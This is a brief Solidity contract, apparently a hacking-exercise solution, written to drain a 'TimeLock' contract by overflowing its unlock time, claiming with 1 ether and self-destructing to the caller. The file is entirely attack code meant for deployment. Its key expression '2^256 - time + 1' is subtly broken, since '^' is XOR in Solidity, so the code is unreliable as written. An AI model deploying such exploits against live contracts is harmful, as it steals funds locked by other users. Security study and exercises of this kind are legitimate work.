pragma solidity 0.6.12;
// Deploy this function along with 1 ether value to drain TimLock

interface TimeLock{
    function unlockTime() external returns(uint256) ;
    function increaseUnlockTime(uint256 numSeconds) external;
    function claim() external payable;
}

contract HackTimeLock {
    constructor(address payable timeLockAddress) public payable{
        TimeLock TL = TimeLock(timeLockAddress);
        uint256 time = TL.unlockTime();
        TL.increaseUnlockTime(2^256 - time + 1);
        TL.claim{value: 1 ether}();
        selfdestruct(payable(msg.sender));
    }
}